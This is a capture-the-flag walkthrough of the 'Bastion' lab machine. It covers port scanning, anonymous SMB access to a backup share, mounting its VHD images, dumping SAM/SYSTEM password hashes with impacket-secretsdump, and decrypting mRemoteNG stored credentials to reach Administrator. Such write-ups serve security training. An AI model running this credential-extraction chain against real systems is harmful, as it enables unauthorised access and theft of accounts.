# Bastion

**Machine Information**

	IP : 10.10.10.134
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan` which should reveal multiple open ports: `22`, `135`, `139`, `445`, and `5985`.

```
rustscan -a 10.10.10.134 -- -sC -sV
```

```
PORT      STATE SERVICE      REASON  VERSION
22/tcp    open  ssh          syn-ack OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-11T07:51:24+02:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21730/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18741/udp): CLEAN (Timeout)
|   Check 4 (port 56495/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-05-11T05:51:26
|_  start_date: 2024-05-10T03:32:18
```

### Getting a Foothold

**SMB**

Checking the SMB shares without any credentials reveals one called `Backups`.

```
smbclient -N -L 10.10.10.134
```

Connect to the SMB share and see which files are accessible.

```
smbclient -N \\\\10.10.10.134\\Backups
```

After a bit of exploration it appears to be the remnants of a Windows Backup.

```
smb: \WindowsImageBackup\L4mpje-PC\> dir
  .                                  Dn        0  Fri Feb 22 23:45:32 2019
  ..                                 Dn        0  Fri Feb 22 23:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 23:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 23:45:32 2019
  MediaId                            An       16  Fri Feb 22 23:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 23:45:32 2019```
```

**Mounting Shares**

 Mount the share on our attack machine to investigate the files further.

```
sudo mkdir /mnt/smb 
sudo mount -t cifs //10.10.10.134/Backups /mnt/smb
```

In the `WindowsImageBackup` folder there are two VHD files.

```
ls -la '/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351'
```

```
-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

A bit research found a way to mount these to the share `/mnt/vhd`. Create a new mount point.

```
sudo mkdir /mnt/vhd
```

For this I used `guestmount` which can be installed using the following command:

```
sudo apt install guestmount
```

Mount both of the VHD files.

```
sudo guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

```
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

**Dumping NTLM Hashes**

Explore the file system to find the `SAM` and `SYSTEM` file in the `System32` direcotry:

```
sudo ls -la /mnt/vhd/Windows/System32/config
```

```
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
```

We can dump the NTLM hashes using `impacket-secretsdump`.

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

The NTLM hash for the user `L4mpje` was found on `CrackStation`. Using these credentials we can access the machine using SSH.

```
ssh l4mpje@10.10.10.134
```

Success!

```
l4mpje@BASTION C:\Users\L4mpje>whoami                                            bastion\l4mpje
```

The user flag can be found in the following directory:

```
C:\Users\L4mpje\Desktop\user.txt
```

### Privilege Escalation

Checking the installed applications shows one that I have never seen, `mRemoteNG`

```
dir "C:\Program Files (x86)"
```

```
22-02-2019  15:01    <DIR>          mRemoteNG
```

After a bit of research we found where the credentials are stored for this application.

```
dir C:\Users\L4mpje\AppData\Roaming\mRemoteNG
```

If we print the contents of the `confCons.xml` file we receive username and password hashes for our user and the Administrator. Using the following tool we can decrypt the hash for both users.

> https://github.com/haseebT/mRemoteNG-Decrypt

```
python3 mremoteng_decrypt.py -s "<HASH>"
```

Now that we have credentials for the Administrator we can SSH in again.

```
ssh administrator@10.10.10.134
```

We can find the root flag in the following location:

```
C:\Users\Administrator\Desktop\root.txt
```
